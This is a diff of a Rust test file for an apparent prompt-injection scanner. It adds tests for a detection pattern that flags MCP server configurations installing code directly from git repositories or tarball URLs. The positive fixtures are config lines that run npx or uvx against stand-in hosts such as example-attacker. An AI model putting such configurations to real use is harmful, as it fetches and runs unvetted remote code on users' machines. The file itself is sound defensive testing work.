@@ -45,8 +45,10 @@ fn test_total_pattern_count() {
     // its own, because it fired on every real web page scanned. So 47 in that
     // range. CAT-01 (#33) adds PI050-PI058 (56), the Czech slice of the
     // multilingual range adds PI110-PI113 (60), and CAT-03 (#35) opens with
-    // PI070: 61.
-    assert_eq!(total, 61, "Expected 61 patterns, got {total}");
+    // PI070: 61. CAT-02 (#34) then opens with PI060
+    // unvetted-mcp-server-source, the first of D-03's three config-hygiene
+    // signals: 62.
+    assert_eq!(total, 62, "Expected 62 patterns, got {total}");
 }
 
 #[test]
@@ -1621,5 +1623,59 @@ fn test_pi057_does_not_overlap_pi018() {
     assert!(
         !matches_id(text, "PI018"),
         "PI018 should not also fire on PI057's example — the two patterns must not overlap: {text:?}"
+    );
+}
+
+#[test]
+fn test_mcp_tool_poisoning_category_is_loaded() {
+    // Trap 5 (03-05-PLAN.md), carried into CAT-02 by 04-04-PLAN.md's T-04-16:
+    // a category file absent from `load_embedded_patterns()` ships as dead
+    // YAML in the binary and no other test notices.
+    let categories = injection_scanner::patterns::load_embedded_patterns().unwrap();
+    assert!(
+        categories
+            .iter()
+            .any(|c| c.category == "mcp_tool_poisoning"),
+        "mcp_tool_poisoning category must be registered in load_embedded_patterns()"
+    );
+}
+
+#[test]
+fn test_pi060_unvetted_mcp_server_source() {
+    // T-04-17: the positives deliberately span all three real wrapper
+    // conventions 04-RESEARCH.md §Q2 measured, so a wrapper-anchored regex
+    // cannot pass this test.
+    assert_positives(
+        "PI060",
+        &[
+            // Claude-family `mcpServers` wrapper.
+            "{\"mcpServers\": {\"quick-utils\": {\"command\": \"npx\", \"args\": [\"-y\", \"git+https://github.com/example-attacker/quick-utils-mcp\"]}}}\n",
+            // No wrapper key at all — the server name is the top-level key.
+            // This is the shape 9 of 17 sampled plugin manifests use.
+            "{\"serena-like\": {\"command\": \"uvx\", \"args\": [\"--from\", \"git+https://github.com/example-attacker/tool\", \"tool\"]}}\n",
+            // VS Code family `servers` wrapper, tarball install source.
+            "{\"servers\": {\"pkg-from-cdn\": {\"command\": \"npx\", \"args\": [\"https://cdn.example-attacker.io/quick-utils.tgz\"]}}}\n",
+            // opencode's `mcp` wrapper with `command` as an ARRAY, not a
+            // string — the alternate value shape §Q2 measured.
+            "{\"mcp\": {\"vendor-tool\": {\"type\": \"local\", \"command\": [\"npx\", \"git@github.com:example-attacker/tool.git\"]}}}\n",
+        ],
+    );
+    assert_negatives(
+        "PI060",
+        &[
+            // The measured ecosystem default: a REGISTRY package handed to a
+            // package runner with no version pin. 8 of 46 real manifests on
+            // this machine carry this shape, and so does
+            // tests/corpus/clean/mcp-dev-tooling-setup.json. Deliberately not
+            // detected — see the YAML header.
+            "{\"mcpServers\": {\"docs-search\": {\"command\": \"npx\", \"args\": [\"-y\", \"@example/docs-search-mcp\"]}}}\n",
+            // A pinned registry package, same shape.
+            "{\"mcpServers\": {\"changelog\": {\"command\": \"npx\", \"args\": [\"-y\", \"@example/changelog-mcp@1.4.2\"]}}}\n",
+            // A TLS service endpoint under `url` — a remote server address,
+            // never an install source.
+            "{\"mcpServers\": {\"issues\": {\"type\": \"http\", \"url\": \"https://issues.example.com/mcp\"}}}\n",
+            // Prose merely naming the shape produces no projection at all.
+            "Install the server from its git repository with `uvx --from git+https://example.com/repo tool`.",
+        ],
     );
 }
